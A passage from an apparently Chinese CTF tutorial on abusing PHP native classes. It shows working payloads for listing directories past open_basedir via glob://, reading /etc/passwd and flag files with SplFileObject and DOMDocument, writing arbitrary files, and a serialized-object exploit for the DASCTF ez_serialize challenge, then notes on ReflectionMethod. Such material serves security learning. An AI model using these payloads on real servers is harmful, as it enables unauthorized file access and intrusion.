<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure></div>

<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 <code>__toString()</code> 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 <code>GlobIterator(/*flag*)</code>：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;/*flag*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t019d71875efa520b79.png"
                      alt="img"
                ></p>
<h4 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h4><p><strong>使用可遍历目录类绕过 open_basedir</strong></p>
<ul>
<li><strong>使用 DirectoryIterator 类</strong></li>
</ul>
<p>DirectoryIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们输入 <code>/?whoami=glob:///*</code> 即可列出根目录下的所有文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t014f113473c3fd1a41.png"
                      alt="img"
                ></p>
<p>列出Web目录下的所有文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01db9c253f8441915c.png"
                      alt="img"
                ></p>
<ul>
<li><strong>使用 FilesystemIterator 类</strong></li>
</ul>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t014e5fd4f194a65ebe.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01323445a82102874e.png"
                      alt="img"
                ></p>
<ul>
<li><strong>使用 GlobIterator 类</strong></li>
</ul>
<p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob:&#x2F;&#x2F;协议了。</p>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t015bbb2d4fe8bdee0a.png"
                      alt="img"
                ></p>
<h3 id="读写文件类"><a href="#读写文件类" class="headerlink" title="读写文件类"></a>读写文件类</h3><p>目前发现的可读取文件类有：</p>
<ul>
<li>SplFileObject 类</li>
</ul>
<h4 id="SplFileObject-类"><a href="#SplFileObject-类" class="headerlink" title="SplFileObject 类"></a><strong>SplFileObject 类</strong></h4><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a class="link"   href="https://www.php.net/manual/zh/class.splfileobject.php" >https://www.php.net/manual/zh/class.splfileobject.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t015ad4b4ea81b98897.png"
                      alt="img"
                ></p>
<p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01e61633c368318ca7.png"
                      alt="img"
                ></p>
<h5 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h5><p><strong>[2021 MAR DASCTF 明御攻防赛]ez_serialize</strong></p>
<p>进入题目，给出源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">B</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">ctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>()    // 可以直接绕过<span class="title">__wakeup</span>()方法的执行</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">bad</span> <span class="title">hacker</span>~&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在A类中可以动态拼接类，就像PHP动态执行函数一样。但是题目给出的A、B、C三个类但是都没有什么危险函数，应该是没有利用的点，想到应该是原生类的利用。我们可以利用上面说的那几个文件处理的原生去读文件。</p>
<p>首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;FilesystemIterator&#x27;</span>;    </span><br><span class="line">    <span class="comment">// FilesystemIterator(&quot;/var/www/html&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure></div>

<p>得到payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;FilesystemIterator&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;para&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;/var/www/html/&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;check&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t017bf6cf0e8cbba2b4.png"
                      alt="img"
                ></p>
<p>并在这个文件夹中找到了flag.php：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01cc3bab7d6845ea73.png"
                      alt="img"
                ></p>
<p>然后我们使用 SplFileObject 类读取flag.php就行了：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&#x27;SplFileObject&#x27;</span>;    </span><br><span class="line">    <span class="comment">// SplFileObject(&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>  = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure></div>

<p>得到payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;para&quot;</span>;s:<span class="number">55</span>:<span class="string">&quot;/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;check&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01c17b881f1f7f4299.png"
                      alt="img"
                ></p>
<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p><strong>写文件poc</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);</span><br><span class="line">$f-&gt;fwrite(&quot;file&quot;);</span><br></pre></td></tr></table></figure></div>



<h4 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h4><h5 id="读文件poc-1"><a href="#读文件poc-1" class="headerlink" title="读文件poc"></a>读文件poc</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读文件</span></span><br><span class="line"><span class="comment"># 先用 convert.base64 将文件内容base64，避免出现额外的 &lt;p&gt; 标签</span></span><br><span class="line"><span class="comment"># 然后将读取的内容转换成 XML 格式，再加载它，最后取 &lt;p&gt; 标签内的内容 (如果想获取纯净流则可以再进行base64解码)</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</span><br></pre></td></tr></table></figure></div>



<h5 id="写文件poc"><a href="#写文件poc" class="headerlink" title="写文件poc"></a>写文件poc</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写文件</span></span><br><span class="line"><span class="comment"># 先用 string.strip_tags 将多余的 HTML 标签去掉，然后再用 convert.base64 将多余的其他杂质 (如空格，双引号等非base64字符去掉)</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;./test.php&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>



<h2 id="反射类Reflection"><a href="#反射类Reflection" class="headerlink" title="反射类Reflection"></a>反射类Reflection</h2><p>它可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。</p>
<p> </p>
<h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>利用功能：<br>- 设置类中私有&#x2F;受保护是否可以直接访问<br>- 通过反射调用方法<br>- 获取方法信息</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反射调用方法</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">&quot;class?&quot;</span>,<span class="string">&quot;method?&quot;</span>))-&gt;<span class="title function_ invoke__">invoke</span>(<span class="keyword">new</span> [<span class="keyword">class</span>?]/<span class="title function_ invoke__">NULL</span>(静态类),args1,args2);</span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">&quot;class?&quot;</span>,<span class="string">&quot;method?&quot;</span>))-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">new</span> [<span class="keyword">class</span>?]/<span class="title function_ invoke__">NULL</span>(静态类,[args1,args2]));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置私有/受保护方法</span></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">&quot;class?&quot;</span>,<span class="string">&quot;method?&quot;</span>);</span><br><span class="line"><span class="variable">$f</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$f</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="keyword">new</span> [<span class="keyword">class</span>?]);</span><br><span class="line">(<span class="keyword">new</span> [<span class="class"><span class="keyword">class</span>?])-&gt;[<span class="title">method</span>?](); // 会报错</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"># 获取函数信息</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getDeclaringClass</span>() // 获取反射方法的类作为反射类返回</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isAbstract</span>() // 方法是否是抽象方法</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isConstructor</span>() // 方法是否是 <span class="title">__construct</span></span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isDestructor</span>() // 方法是否是 <span class="title">__destruct</span></span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isFinal</span>() // 方法是否定义了<span class="title">final</span></span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isPrivate</span>() // 方法是否是私有方法</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isProtected</span>() // 方法是否是受保护方法</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isPublic</span>() // 方法是否是公有方法</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isStatic</span>() // 方法是否是静态方法</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getDocComment</span>() // 获取方法注释内容</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getStartLine</span>() // 获取方法开始行号</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getEndLine</span>() // 获取方法结束行号</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getExtensionName</span>() // 获取扩展名称</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getName</span>() // 获取方法名称</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getNamespaceName</span>() // 获取命名空间名称</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getNumberOfParameters</span>() // 获取方法参数数量</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getNumberOfRequiredParameters</span>() // 获取方法必须传入的参数数量</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getParameters</span>() // 获取方法参数名</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getShortName</span>() // 获取方法短名</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">getStaticVariables</span>() // 获取方法静态变量</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">hasReturnType</span>() // 方法是否有特定返回类型</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">inNamespace</span>() // 方法是否定义在命名空间</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isClosure</span>() // 方法是否是匿名函数</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isDeprecated</span>() // 方法是否弃用</span></span><br><span class="line"><span class="class">(<span class="title">new</span> <span class="title">ReflectionMethod</span>(&quot;<span class="title">class</span>?&quot;,&quot;<span class="title">method</span>?&quot;))-&gt;<span class="title">isGenerator</span>() // 方法是否是生成器函数</span></span><br><span class="line"><span class="class">(<span 